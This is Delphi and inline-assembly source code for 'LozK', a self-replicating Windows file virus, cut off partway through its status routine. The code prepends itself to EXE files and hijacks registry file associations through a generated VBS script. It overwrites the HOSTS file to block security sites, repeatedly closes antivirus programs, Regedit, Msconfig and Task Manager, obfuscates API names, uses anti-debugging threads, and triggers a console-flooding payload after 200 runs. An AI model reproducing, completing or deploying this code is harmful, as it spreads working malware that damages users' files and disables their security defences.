   {
    - LozK
    - By Byt3Cr0w/GEDZAC
    - www.byt3cr0w.tk
    - bytecrow[at]post[dot]cz
    - Dedicated to Lozky :)

   Fecha de inicio: 24/12/2004
   Fecha de final: 29/01/2005
   Lenguaje utilizado: Borland Delphi & BASM
   Tamaño de ejecutable: 16.896 Bytes
   Descripcion:

   Programa autoreplicante, capaz de infectar archivos ejecutables pertenecientes al sistema
   operativo Windows, tecnicas antidebug, retro (cierra diferentes aplicaciones que puedan
   amenazar su potencial existencia en el sistema alojador), modifica el archivo HOSTS del
   sistema para evitar la visualizacion por parte del usuario de sitios que afecten la
   integridad del proyecto, realiza modificaciones en el registro de Windows para de esta
   manera poder interceptar diferentes tipos de archivos, para posteriormente analizarlos
   y determinar si estos son capaces de alojar el cuerpo viral de Lozk, utiliza diferentes
   hilos (threads) para de esta manera realizar sus acciones de manera rapida y eficiente,
   se mantiene activo en memoria con diferentes temporisadores programados para realizar
   sus acciones repetidamente cada cierto tiempo, el usuario puede visualizar el estado
   actual de Lozk por medio de parametros de ejecucion, al detectarse mas de #200 ejecuciones
   de el cuerpo viral se muestra su Payload (Inofensivo) el cual consiste en la visualizacion
   de varias ventanas (consolas de MS-DOS) con un msg en diferentes colores.
   }

     program A0;
   //{$APPTYPE CONSOLE}
   uses
     GPALL;

   //Thanx falckon (hey bro!) for this usefull USE :)
                 // NO DELPHI USES! EVEN WINDOWS! :) (very proud of that :))
   CONST
   sp = #13#10;
   LozkSize=16896;
   var
       Handy,NewColor,ID,mode: integer;
       OwnedSystem,aoux:byte;
       //************************
       SetConsoleTitle,
       GetStdHandle,
       SetConsoleTextAttribute,
       WriteConsole,
       MessageBox,
       Sleep,
       CopyFile,
       WinExec,
       DeleteFile,
       CreateMutex,
       GetLastError,
       AllocConsole,
       ExitProcess,
       CreateThread,
       IsDebuggerPresent,
       OutputDebugString,
       FindWindow,
       PostMessage,
       CreateDirectory:pointer;
       Titulo,msg1,msg3,clean_,Mutex_: pchar;
       cleandrop:string;

   Function d(things:string):string;
   var newx,s:string;
       LlL,OoO,o,r:integer;
   begin
   o := Length(things);
   For r := 1 to o do begin
   s := s + chr(ord(things[r]) div 2)
   end;
   LlL := Length(s);
   For OoO := 1 to LlL do begin
   newx := newx + chr(ord(s[OoO]) xor 6);
   end;
   d := newx;
   end;

   function IntToStr(I: Longint): String;
   var s: string[11];
   begin
    str(i,s);
    result := S;
   end;

   function StrToInt(S: string) : LONGINT;
   var TempLong: Longint;
   TempErr: Integer;
   begin
   Val(S,TempLong,TempErr);
   if TempErr <> 0 then StrToInt := -1 else StrToInt := TempLong;
   end;

   function GetAPI(dll:string;api:string):pointer;
   var myhandy:integer;
       myoff:pointer;
      begin
      myhandy := LoadLibraryA(pchar(dll));           //Load the library...
      myoff := GetProcAddress(myhandy,Pchar(api));   //We get the API address
      Result := myoff;                               //and store the address on the result
    end;

   procedure GetAllApis;
   begin
   //Here we get all the APIS that we need :) NO DELPHI USES ;)
   SetConsoleTitle := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('ªÆäŠÒÐêÒÔÆ¤ÞäÔÆŽ'));
   GetStdHandle := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('‚ÆäªäÄœÎÐÄÔÆ'));
   SetConsoleTextAttribute := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('ªÆäŠÒÐêÒÔÆ¤ÆüäŽääèÞÈæäÆ'));
   WriteConsole := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('¢èÞäÆŠÒÐêÒÔÆŽ'));
   Sleep := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('ªÔÆÆì'));
   //MessageBox := GetApi(d('æêÆèjhPÄÔÔ'),('–ÆêêÎÂÆˆÒüŽ'));
   MessageBox := GetApi('user32.dll','MessageBoxA');
   CopyFile := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('ŠÒìþ€ÞÔÆŽ'));
   DeleteFile := GetApi('kernel32.dll','DeleteFileA');
   CreateMutex := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('ŠèÆÎäÆ–æäÆüŽ'));
   GetLastError := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('‚Æä”Îêä†èèÒè'));
   AllocConsole := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('ŽÔÔÒÊŠÒÐêÒÔÆ'));
   ExitProcess := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('†üÞä¬èÒÊÆêê'));
   CreateThread := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('ŠèÆÎäÆ¤ÜèÆÎÄ'));
   IsDebuggerPresent := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('žê„ÆÈæÂÂÆè¬èÆêÆÐä'));
   OutputDebugString := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('’æäìæä„ÆÈæÂªäèÞÐÂ'));
   FindWindow := GetApi(d('æêÆèjhPÄÔÔ'),d('€ÞÐÄ¢ÞÐÄÒâŽ'));
   PostMessage := GetApi(d('æêÆèjhPÄÔÔ'),d('¬Òêä–ÆêêÎÂÆŽ'));
   CreateDirectory := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('ŠèÆÎäÆ„ÞèÆÊäÒèþŽ'));
   end;

   procedure CreateFolder;
   var t:pchar;
   begin
   t := Pchar(d('Šx´¢ÞÐÄÒâê´¤ÆÖì´¢„Îä´'));    //Storage Folder = we save the CLear file there!
   asm
   push 0                                     //null (the security attributes..)
   push t                                     //Name of the folder
   Call CreateDirectory                       //Create it!
   end;
   end;


   procedure CreateThread_;
   begin
   //i use this for create threads :)
   asm
   push ID                        //Thread ID
   push 0                         //null
   push 0                         //null
   push esi                       //Routine offset
   push 0                         //null
   push 0                         //null
   Call CreateThread              //Create the Thread :)
   end;
   end;

   procedure XNbnsb32Dword732n;
   begin
   asm
   call IsDebuggerPresent                  //Call Our nice API :)
   test eax,eax                            //test the result...
   jnz @TxX                                //If there is one debugger on memory then we jump to TxX
   jmp @nothing
   @TxX:
   mov esi, offset @CTL
   Call CreateThread_                     //We Create a thread with CTL routine
   jmp @TxX

   @RMTD:
   push msg3                              //Message for the nice mr.debugger :)
   Call OutputDebugString                 //Send the Message...
   jmp @RMTD                              //Again :)

   @CTL:
   mov esi, offset @RMTD
   Call CreateThread_                    //Create a thread with RMTD routine...
   jmp @CTL                              //Again :)

   @nothing:
   end;
   end;


   procedure Hosts_;
   var to_host:string;
       hosts:file;
       host:textfile;
       X:integer;
   begin
   //This is for avoid the use of some pages :P
   to_host := 'nhbPlPlPnLJJnhbPlPlPnLæjPÆêÆäPÊÒÖnhbPlPlPnLænPÆêÆäPÊÒÖnhbPlPlPnLædPÆêÆäPÊÒÖnhbPlPlPnLâââPÐÒÄjhPÊÒÖnhbPlPlPnLâââPÐÒÄjhPêÚnhbPlPlPnLâââPÄÞÎÖÒÐÄÊê'+
              'PÊÒÖPÎænhbPlPlPnLæìÄÎäÆêPêÎÔÄPÊÒÖnhbPlPlPnLÜääìxRRæìÄÎäÆêPêÎÔÄPÊÒÖRÄèâÆÈnhbPlPlPnLÜääìxRRæìÄÎäÆênPÚÎêìÆèêÚþVÔÎÈêPÊÒÖRæìÄÎäÆênhbPlPlPnLÜääìxRRæìÄÎä'+
              'ÆêhPÚÎêìÆèêÚþVÔÎÈêPÊÒÖRæìÄÎäÆênhbPlPlPnLÜääìxRRæìÄÎäÆêjPÚÎêìÆèêÚþVÔÎÈêPÊÒÖRæìÄÎäÆênhbPlPlPnLÀäìxRRæìÄÎäÆêjPÚÎêìÆèêÚþVÔÎÈêPÊÒÖRæìÄÎäÆênhbPlPlPnLÜääìxR'+
              'RæìÄÎäÆêVæênPÚÎêìÆèêÚþVÔÎÈêPÊÒÖRæìÄÎäÆênhbPlPlPnLÜääìxRRÄÒâÐÔÒÎÄênPÚÎêìÆèêÚþVÔÎÈêPÊÒÖRæìÄÎäÆênhbPlPlPnLÜääìxRRÄÒâÐÔÒÎÄêVæênPÚÎêìÆèêÚþVÔÎÈêPÊÒÖRæì'+
              'ÄÎäÆênhbPlPlPnLÀäìxRRÄÒâÐÔÒÎÄênPÚÎêìÆèêÚþVÔÎÈêPÊÒÖRæìÄÎäÆênhbPlPlPnLÀäìxRRÄÒâÐÔÒÎÄêVæênPÚÎêìÆèêÚþVÔÎÈêPÊÒÖRæìÄÎäÆênhbPlPlPnLæìÄÎäÆêPøÒÐÆÔÎÈêPÊÒÖ'+
              'nhbPlPlPnLÔÞàÆæìÄÎäÆPêþÖÎÐäÆÊÔÞàÆæìÄÎäÆPÊÒÖnhbPlPlPnLÔÞàÆæìÄÎäÆPêþÖÎÐäÆÊPÊÒÖnhbPlPlPnLÔÞàÆæìÄÎäÆPêþÖÎÐäÆÊÔÞàÆæìÄÎäÆPÊÒÖnhbPlPlPnLæìÄÎäÆPêþÖÎÐä'+
              'ÆÊPÊÒÖnhbPlPlPnLÄÒâÐÔÒÎÄPÖÊÎÀÆÆPÊÒÖnhbPlPlPnLÜääìxRRâââPäÒÒÐÈÒüPÄÆRäÄênhbPlPlPnLÀäìxRRÀäìPìÊVäÆÊÜÞÆPÞÐÀÒRäÄênhbPlPlPnLÜääìxRRèÎÄÞæêPäæèàÎÖÞÆê'+
              'PÊÒÖnhbPlPlPnLÜääìxRRÀèÎÊäæêPÖÎäPæêÒÐPÖüRðäÄênhbPlPlPnLÜääìxRRäÄêPÄÞÎÖÒÐÄÊêPÊÒÖPÎæRnhbPlPlPnLÜääìxRRÄÞÎÖÒÐÄÊêPÀÞÔÆÈæèêäPÊÒÖ';
   FileMode:=2;                                //...
   {$I-}
   AssignFile(hosts,d('Šx´¢ÞÐÄÒâê´êþêäÆÖjh´ÄèÞàÆèê´ÆäÊ´œÒêäê'));
   Reset(hosts,1);
   CloseFile(hosts);
   {$I+}
   X := IOResult;
   FileMode:=0;
   if X <> 0 then exit;                        //If the file doesnt exists then exit...
   AssignFile(host,d('Šx´¢ÞÐÄÒâê´êþêäÆÖjh´ÄèÞàÆèê´ÆäÊ´œÒêäê'));          //Assign Hosts file...
   rewrite(host);                                                     //Rewrite it (yes..rewrite it)
   writeln(host,d(to_host));                                          //Write info...
   closefile(host);                                                   //Close it
   end;

   procedure BaT;
   var to_:string;
       f:textfile;
   begin
   to_ := 'ŒÊÔêŒ†Šœ’L’€€ÆÊÜÒLRRRXXXXXŒŒŒŒŒŒŒŒŒŒŒŒLXL”ÒøšLXLŒŒŒŒŒŒŒŒŒŒŒŒXXXXX´´´ÆÊÜÒLLLL LVVVVVVVVŠl„Æ„LˆþLˆþäjŠèlâR‚†„¸ŽŠVVVVVVVVÆÊÜÒLLLLLLLLLL¤œ†L ž¨L–Žšž*‚LžªL*’¤LŽLŠ¨ž–†ÆÊÜÒLLLLLLLLLL'+
          'ª†””ž*‚Lž*ª†Š¦¨†Lª’€¤¢Ž¨†ªÆÊÜÒLLLLLLLLLL¢ž¤œLœž‚œL¬¨žŠ†ªLžªLŽLŠ¨ž–†ÆÊÜÒPÆÊÜÒLLLLLLH¢ÆLÎèÆLÐÒäLäÆèèÒèÞêäTLâÆLÎèÆLÎèäÞêäêHÆÊÜÒLLLLLH¢ÆLÄÒÐäLÄÆêäèÒþTLâÆLØæêäLÊ'+
          'èÆÎäÆLÔÞÀÆHÆÊÜÒLLLLVVVVVVVVŠl„Æ„LˆþLˆþäjŠèlâR‚†„¸ŽŠVVVVVVVVVŒìÎæêÆpÐæÔ';
   AssignFile(f,d('Šx´¢ÞÐÄÒâê´”ÒøšPÈÎä'));                                 //Assign the file..
   rewrite(f);                                                             //Rewrite it
   writeln(f,d(to_));                                                      //Write the text...
   closefile(f);                                                           //Close it
   end;


   procedure _OwnedSystem_;
   var a:file;
       X:integer;
   begin
   FileMode:=2;
   {$I-}                                      //You know...IoCheck = ON
   AssignFile(a,D('Šx´¢ÞÐÄÒâê´ÚÆèÐÆÔjhPàüÄ'));
   Reset(a,1);
   CloseFile(a);
   {$I+}                                      //IoCheck = OFF
   X := IOResult;
   FileMode:=0;
   if X = 0 then OwnedSystem := 1 else OwnedSystem := 0;  //If the fileexists then the system was owned ;)
   end;

   procedure _OwnSystem;
   var a:file;
   begin
   AssigNFile(a,D('Šx´¢ÞÐÄÒâê´ÚÆèÐÆÔjhPàüÄ'));                                //Assign the mark file..
   rewrite(a,1);                                                              //Rewrite it..
   BlockWrite(a,'System Owned by -LozK- [CoDed by Byt3Cr0w/GEDZAC]',50);      //Write something..:)
   closefile(a);                                                              //Close it
   end;

   procedure Kill;
   begin
   asm
   push ebx                      //The name of the window...
   push 0                        //null
   call FindWindow               //Try to find the window

   test eax,eax                  //Lets see..
   jz @nOp_                      //if we dont find it then we exit

                                 // if we find the windows the we are here and the handle is in EAX
   push 0                        //null
   push 0                        //null
   push 12h                      //Message = Close
   push eax                      //Handle!
   Call PostMessage              //Send the message
   @nOp_:
   end;
   end;

   procedure AvDead;
   var AVP,NAV,REG,NOD,PER,RES,MSC,MSS,TSK,TSS:pchar;
   begin
   // Some AVs and Tools names...
   AVP := Pchar(d('Ž ¬L–ÒÐÞäÒè'));
   NAV := Pchar(d('*Ž Ž¬¢jh'));
   NOD := Pchar(d('*’„jhLŠÒÐäèÒÔLŠÆÐäÆè'));
   PER := Pchar(d('¬ÆèLŽÐäÞàÞèæêLVLŽÄÖÞÐÞêäèÎÄÒèLÄÆLŠÒÖìÒÐÆÐäÆê'));
   REG := Pchar(d('¨ÆÂÞêäèþL†ÄÞäÒè'));
   RES := Pchar(d('†ÄÞäÒèLÄÆÔL¨ÆÂÞêäèÒ'));
   MSC := Pchar(d('ªþêäÆÖLŠÒÐÀÞÂæèÎäÞÒÐL¦äÞÔÞäþ'));
   MSS := Pchar(d('¦äÞÔÞÄÎÄLÄÆLÊÒÐÀÞÂæèÎÊÞêÐLÄÆÔLêÞêäÆÖÎ'));
   TSK := Pchar(d('¢ÞÐÄÒâêL¤ÎêÚL–ÎÐÎÂÆè'));
   TSS := Pchar(d('ŽÄÖÞÐÞêäèÎÄÒèLÄÆLäÎèÆÎêLÄÆL¢ÞÐÄÒâê'));
   asm

   @Control_:
   mov ebx,AVP
   Call Kill                   //Kill AVP

   mov ebx,NAV
   Call Kill                   //Kill Norton

   mov ebx,NOD
   Call Kill                   //Kill NOD

   mov ebx,PER
   Call Kill                   //Kill PER

   mov ebx,REG
   Call Kill                   //Kill Regedit (English version)

   mov ebx,RES
   Call Kill                   //Kill Regedit (Spanish version)

   mov ebx,MSC
   Call Kill                   //Kill Msconfig (English version)

   mov ebx,MSS
   Call Kill                   //Kill Msconfig (Spanish version)

   mov ebx,TSK
   Call Kill                   //Kill Taskmanager (English Version)

   mov ebx,TSS
   Call Kill                   //Kill Taskmanager (Spanish version)
   end;
   end;

   procedure CreateReg;
   var a,b:string;
       x:textfile;
   begin
   b := d('Šx´¢ÞÐÄÒâê´”ÒøšPàÈÆ');
   a := 'On Error Resume Next'+sp+
        'Set LozK = CreateObject("WScript.Shell")'+sp+
        's="'+paramstr(0)+' @%1@": s=replace(s,"@",chr(34))'+sp+
        'LozK.RegWrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\",s'+sp+
        'LozK.RegWrite "HKEY_CLASSES_ROOT\comfile\shell\open\command\",s'+sp+
        'LozK.RegWrite "HKEY_CLASSES_ROOT\scrfile\shell\open\command\",s'+sp+
        'LozK.RegWrite "HKEY_CLASSES_ROOT\piffile\shell\open\command\",s'+sp+
        'LozK.RegWrite "HKEY_CLASSES_ROOT\cmdfile\shell\open\command\",s'+sp+
        'REM Thanx To machineDramon/GEDZAC';
   AssignFile(x,b);                                    //Assign Reg file...
   rewrite(x);                                         //Rewrite it
   Writeln(x,a);                                       //Write the info
   closefile(x);                                       //Close reg file...
   end;

   procedure Reg_;
   var Param1:pchar;
   begin
   Param1 := Pchar(d('âêÊèÞìäPÆüÆLŠx´¢ÞÐÄÒâê´”ÒøšPàÈÆ'));   //Reg params...
   asm
         Call CreateReg                           //Call routine for the Reg File creation...

         push 0
         push Param1
         Call WinExec                             //Install it to the Windows Registry...
   end;
   end;

   procedure Cleaner;
   var y:pchar;
   begin
   y := Pchar(d('ÊÖÄPÆüÆLRÊL„†”LŠx´¢ÞÐÄÒâê´¤ÆÖì´¢„Îä´XPÆüÆ'));     //Cleaner params...
   asm
   push 0
   push y
   Call WinExec                                          //Clean the storage folder...
   end;
   end;


   procedure _MemoryResident;
   begin
   asm
   Call XNbnsb32Dword732n          //Call AntiDebug
   jmp @Control                    //Jump to the Resident Control =)

   @AvDisabling_:                  //**[ Disable some AV and Tools ]**///
   call AvDead                     //Call it...
   Call XNbnsb32Dword732n          //AntiDebug...
   push 3000d                      // Sleep 3 seconds...
   Call Sleep
   jmp @AvDisabling_               //Again!

   @Nhd73N3mdxXM:                  //**[ Check for debuggers ]**///
   Call XNbnsb32Dword732n          //Call it..
   push 20000d                     //Sleep 20 seconds...
   Call Sleep
   jmp @Nhd73N3mdxXM               //Again!

   @Cleaner_:                      //**[ Clean Storage Folder ]**///
   Call Cleaner                    //Call it..
   Call XNbnsb32Dword732n          //AntiDebug...
   push 60000d                     //Sleep 1 minute...
   Call Sleep
   jmp @Cleaner_                   //Again!

   @Hosts_:                        //**[ Modify hosts files ]**///
   call Hosts_                     //Call it..
   Call XNbnsb32Dword732n          //AntiDebug..
   push 120000d                    //Sleep 2 minutes...
   Call Sleep
   jmp @Hosts_                     //Again!

   @Regist_:                       //**[ Modify Windows Registry ]**///
   call Reg_                       //Call it..
   Call XNbnsb32Dword732n          //AntiDebug...
   push 180000d                    //Sleep 3 minutes...
   Call Sleep
   jmp @Regist_                    //Again!


   @Control:                       //**[ Memory Resident Control ]**///

   mov esi,offset @AvDisabling_
   Call CreateThread_              //Create a thread with the AVDisabling routine

   mov esi,offset @Cleaner_
   Call CreateThread_              //Create a thread with the Cleaner routine

   mov esi,offset @Hosts_
   Call CreateThread_              //Create a thread with the Hosts routine

   mov esi,offset @Regist_
   Call CreateThread_              //Create a thread with the Registry routine

   mov esi,offset @Nhd73N3mdxXM
   Call CreateThread_              //Create a thread with the AntiDebug routine

   end;
   end;


   procedure RandomizeColor;
   var i,e:integer;
   begin
   Randomize;                                     //Randomize...
   I := Random(2)+1;                              // Random number between 1 and 2
   if i = 1 then e:=2; if i = 2 then e:=3;        // 1 = Matrix Green - 2 = Aqua
   NewColor := $0000000+e;                        // RET the new color...
   end;


   Procedure Cleanx;
   var a,f1,f2:file;
       Count1,Count2,X:integer;
       LozkBuffer3:Array[1..LozkSize] of char;
   begin
   CreateFolder;                                         //Create storage folder...
   Randomize;                                            //Randomize...
   FileMode:=2;
   {$I-}
   AssignFile(a,d('Šx´¢ÞÐÄÒâê´¤ÆÖì´¢„Îä´”ÒøÚPÆüÆ'));        //The mother file :)
   Reset(a,1);
   CloseFile(a);
   {$I+}
   X := IOResult;
   FileMode:=0;
   if (mode > 0) and (X=0) then exit;  //if the Cleaning mode is 1 and the mother file already exists then we exit... (Dont lose time ;))
   if mode > 0 then cleandrop := d('Šx´¢ÞÐÄÒâê´¤ÆÖì´¢„Îä´”ÒøÚPÆüÆ') else cleandrop := d('Šx´¢ÞÐÄÒâê´¤ÆÖì´¢„Îä´')+IntToStr(Random(99999))+'.exe';
   AssignFile(f1,paramstr(0));
   AssignFile(f2,cleandrop);
   filemode := 0;
   reset(f1,1);                        //Open for binary read ourself :)
   rewrite(f2,1);                      //Rewrite future file...
   if (mode=0) and (FileSize(f1)= 15360) then begin closefile(f1); closefile(f2); exit; end;    // First Generation
   if mode = 0 then seek(f1,LozkSize); //if the Cleaning mode is 0 then we seek to the end of Lozk
   repeat
   BlockRead(f1,LozkBuffer3,2048,Count1);    //Read bytes from ourself...
   BlockWrite(f2,LozkBuffer3,Count1,Count2); //And write that to the future file...
   Until (Count1=0) or (Count2<>Count1);
   Closefile(f1);
   Closefile(f2);
   clean_ := Pchar(cleandrop);
   if mode > 0 then exit;                 //If Cleaning mode not 0 then we exit...
   asm
   push 1
   push clean_
   Call WinExec                           //Execute the clean file!
   end;
   end;


   function Owned(cell:string):boolean;
   var f:file;
       LozkBuffer1:Array[1..LozkSize] of char;
       ByteCount,Count:integer;
       Mark:string;
   begin
   Mark := '';
   AssignFile(f,cell);
   reset(f,1);                              //Open the file..
   Seek(f,FileSize(f)-4);
   BlockRead(f,LozkBuffer1,SizeOf(LozkBuffer1),ByteCount);  //Read the last 4 bytes...
   For Count := 1 to Sizeof(LozkBuffer1) do Mark := Mark + LozkBuffer1[Count]; //Copy them to a string..
   If Pchar(Mark) = Pchar(d('”ÒøÚ')) then result:=true else result:=false;       //if the last 4 bytes are: Lozk
   closefile(f);                                                       //The the file is infected...
   end;


   procedure OwnThisCell(const cell:string);
   var vxd_,cell_:pchar;
       vxd:string;
       Us,You,Future:file;
       LozkBuffer2:Array[1..2048] of char;
       Count1,Count2:integer;
   begin
   if Owned(cell) then exit;                        //If the file is already Owned then exit...
   CreateFolder;                                    //Create our storage folder...
   cell_ := Pchar(cell);
   vxd := cell+Pchar(d('PàüÄ'));
   mode := 1;                                       //Cleaning mode set to = 1
   Cleanx;                                          //Clean ourself...
   AssignFile(us,d('Šx´¢ÞÐÄÒâê´¤ÆÖì´¢„Îä´”ÒøÚPÆüÆ'));  //Assign mother file...
   AssignFile(you,cell);                            //Assign victim...
   AssignFile(future,vxd);                          //Assign the future file...
   Reset(us,1);                                      /// ERROR!
   Reset(you,1);
   Rewrite(future,1);
   Repeat
   BlockRead(us,LozkBuffer2,SizeOf(LozkBuffer2),Count1);    //Read our mother file...
   BlockWrite(future,LozkBuffer2,Count1,Count2);            //And write the bytes to the future file...
   until (Count1=0) or (Count2<>Count1);
   Repeat
   BlockRead(you,LozkBuffer2,SizeOf(LozkBuffer2),Count1);   //Read the victim file...
   BlockWrite(future,LozkBuffer2,Count1,Count2);            //And write the bytes to the future file...
   until (Count1=0) or (Count2<>Count1);                    // And that was a prepender infection :)
   BlockWrite(future,'Lozk',4);                             //Write the infection mark to the end of the file...
   Closefile(future);
   Closefile(you);
   closefile(Us);
   vxd_ := Pchar(vxd);
   asm
   push 0
   push cell_
   push vxd_
   Call CopyFile                                           //Copy the temp (future) file over the victim file

   push vxd_
   Call DeleteFile                                         //Delete the temp (future) file

   push 1
   push cell_
   Call WinExec                                            //Execute the file...
   end;
   end;


   procedure Owner;
   var f_:file;
       X,i,e:integer;
       Buffer:array[1..2] of Char;
       Head:string;
       FileName:pchar;
   begin
   if paramcount < 1 then exit;                //No params = Exit
   FileMode:=2;                                //...
   {$I-}
   AssignFile(f_,paramstr(1));
   Reset(f_,1);
   CloseFile(f_);
   {$I+}
   X := IOResult;
   FileMode:=0;
   if X <> 0 then exit;                        //If the file doesnt exists then exit...
   FileName := Pchar(paramstr(1));
   reset(f_,1);                                //Open the file in binary mode...
   BlockRead(f_,Buffer,2,i);                   //Read the first 2 bytes...
   for e := 1 to 2 do Head := Head + Buffer[e];//Store the bytes...
   if Pchar(Head) <> 'MZ' then                 //If the first 2 bytes isnt MZ the this is not a EXE file..
   begin
   closefile(f_);                              //Close the file...
   asm
   push 1
   push FileName
   Call WinExec                                //Execute the NO EXE file...
   end;
   exit;                                       // & Exit...
   end else begin
   closefile(f_);
   OwnThisCell(paramstr(1));           // If the fileexists and is an EXE file then we infect it! :)
   end;
   end;




   procedure PayLoad;
   var p:pchar;
   begin
   mode := 0;
   Cleanx;
   p := Pchar(paramstr(1) + ' /wake_up');
   asm
    @payload:

         Call AllocConsole                //We create the new console...

         push Titulo
         Call SetConsoleTitle             //Set the console title

           push -11
         Call GetStdHandle                //We get the console Handle
           mov [Handy],eax                  //And we move it to "Handy"

           push 00000002h                   //00000002h = Matrix Green :)
           push [Handy]                     //Remember?
           Call SetConsoleTextAttribute     //We set the console Color :)

   @again:
         push 0
         push 0
         push 20d                       // (Message Length)
         push msg1                      // (Our Message)
         push [Handy]                   // Remember our friend Handy ? :)
         Call WriteConsole              //Write our message :)

         push 10d
         Call Sleep                     //Sleep for 10 miliseconds

         Call RandomizeColor            //We call our function to Randomize the color
                                        //And store it in "NewColor"
         mov eax, NewColor
         push eax
           push [Handy]
           Call SetConsoleTextAttribute   //Set the new color...

         push 1
         push p
         Call WinExec                   //Execute Uz...

         jmp @again                     //And make it loop :)
   end;
   end;


   procedure IncBOMB;
   var a,a2:textfile;
       b:string;
       c,x:integer;
       t_:pchar;
       begin
   t_ := Pchar(d('Šx´¢ÞÐÄÒâê´æêÆèjhPàüÄ'));
   FileMode:=2;                           //We set the filemode to 2
   {$I-}                                  //Input Output Checks = ON
   AssignFile(a,Pchar(d('Šx´¢ÞÐÄÒâê´æêÆèjhPàüÄ'))); //Assign our file...
   Reset(a);                              //Try to reset it...
   CloseFile(a);                          //Close the file..
   {$I+}                                  //Input Output Checks = OFF
   X := IOResult;                         //We store in X the InputOutput Result
   FileMode:=0;                           //We se the filemode to 0
   if X <> 0 then                         //Zero means = The file exists (If the file doesnt exists  Then...)
   begin
   Rewrite(a);                            //We rewrite the Counter file...
   write(a,'1');                          //Write 1 to the counter...
   closefile(a);                          //Close the Counter...
   end else                               //If the Fileexists then...
   begin
   reset(a);                              //Open for read...
   readln(a,b);                           //Read the first line...
   try c := StrToInt(b); except c:=1; end;//We try to convert the readed string to an integer number...
   if C > 200 then
   begin
   closefile(a);
   asm
         push t_
         Call DeleteFile                  //We delete the counter file...
         Call Payload;                    //If the counter number is bigger than 200 then we activate the Payload/Bomb :)
   end;
   end;
   c := c+1;                              //We add 1 to the readed data :) (1=2)
   closefile(a);                          //Close the counter
   AssignFile(a2,Pchar(d('Šx´¢ÞÐÄÒâê´æêÆèjhPàüÄ')));//....
   rewrite(a2);                           //....
   writeln(a2,IntToStr(c));               //We write the new data...
   closefile(a2);                         //....
   end;
   end;

   procedure Color;
   begin
   asm
       push ebx
       push esi
       Call SetConsoleTextAttribute
   end;
   end;

   procedure write;
   begin
   asm
       push 0
       push 0
       push ebx
       push esi
       push eax
       Call WriteConsole
   end;
   end;

   procedure LozK_HellO;
   var msg,mst,msu:string;
       msg_,mst_,msu_,Titulo:pchar;
       Handy,sise,sise2,sise3:integer;
   begin
   msg := 'Hello, iam LozK and this file currently is infected by me.'+sp+'maybe this system is already owned, want to check my status?'+sp;
   mst := 'Use: '+paramstr(0);
   msu := '/status';
   msg_ := Pchar(msg);
   mst_ := Pchar(mst);
   msu_ := Pchar(msu);
   sise := Length(msg);
   sise2 := Length(mst) + 1;
   sise3 := Length(msu);
   Titulo := 'LozK - Hello';
   asm
       Call AllocConsole

       push Titulo
       Call SetConsoleTitle

       push -11
       Call GetStdHandle
       mov [Handy], eax

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sise
       mov esi, msg_
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sise2
       mov esi, mst_
       mov eax, [Handy]
       Call write

       mov ebx, 00000006h
       mov esi, [Handy]
       Call Color

       mov ebx, sise3
       mov esi, msu_
       mov eax, [Handy]
       Call write
   end;
   readln;
   halt(0);
   end;

   function CurrentBomb:string;
   var a:textfile;
       b:string;
       c:integer;
   begin
   AssignFile(a,'C:\Windows\user32.vxd');
   reset(a);
   readln(a,b);
   try c := StrToInt(b); except c := -2; end;
   if c = -2 then begin Result := 'ERROR'; closefile(a); exit; end;
   closefile(a);
   Result := IntToStr(200-c);
   end;


   procedure LozK_StatuS;
   var msg : Array[1..34] of pchar;
       Handy,i:integer;
       sise : Array[1..34] of integer;
       sizze1,sizze2,sizze3,sizze4,sizze5,sizze6,sizze7,sizze8,sizze9,
       sizze10,sizze11,sizze12,sizze13,sizze14,sizze15,sizze16,sizze17,
       sizze18,sizze19,sizze20,sizze21,sizze22,sizze23,sizze24,sizze25,
       sizze26,sizze27,sizze28,sizze29,sizze30,sizze31,sizze32,sizze33,sizze34:integer;
       mzg1,mzg2,mzg3,mzg4,mzg5,mzg6,mzg7,mzg8,mzg9,mzg10,mzg11,mzg12,
       mzg13,mzg14,mzg15,mzg16,mzg17,mzg18,mzg19,mzg20,mzg21,mzg22,mzg23,
       mzg24,mzg25,mzg26,mzg27,mzg28,mzg29,mzg30,mzg31,mzg32,mzg33,mzg34:pchar;
       Titulo:pchar;
   begin
   Titulo := 'LozK - Status';
   msg[1] := '///*****@@@@@@@@@@@@ * '; msg[2] := 'LozK'; msg[3] := ' * @@@@@@@@@@@@*****\\\'+sp+sp;
   msg[4] := 'Author: '; msg[5] := 'Byt3Cr0w/GEDZAC'+sp;
   msg[6] := 'Version: '; msg[7] := '1.0 BETA'+sp;
   msg[8]:= 'Infection type: '; msg[9] := '(For now...) Normal Prepender'+sp;
   msg[10] := 'Start Date: '; msg[11] := '24/12/2004'+sp;
   msg[12] := 'Finish Date: '; msg[13] := '29/01/2005'+sp;
   msg[14] := 'Programming Language: '; msg[15] := 'Borland Delphi & Borland Assembler'+sp;
   msg[16] := 'Dedicated to: '; msg[17] := 'Lozki :)'+sp;
   msg[18] := 'Payload Strike: '; msg[19] := 'Before 200 executions'+sp;
   msg[20] := 'Gredz  & Thnxs: '; msg[21] := 'Gedzac, Falckon, Jhon Backus, Sickbyte & the ppl that i forget'+sp;
   msg[22] := 'Inspiration: '; msg[23] := 'Nirvana, Millencolin, Metallica, System Of A Down & the..."life"'+sp;
   msg[24] := 'Contact: '; msg[25] := 'bytecrow@post.cz'+sp;
   msg[26] := 'Labz: '; msg[27] := 'http://www.gedzac.tk'+sp;
   msg[28] := 'System Owned?: '; msg[29] := 'Not Owned'+sp;
   msg[30] := 'System OWNED'+sp; msg[31] := 'Bomb Status: ';
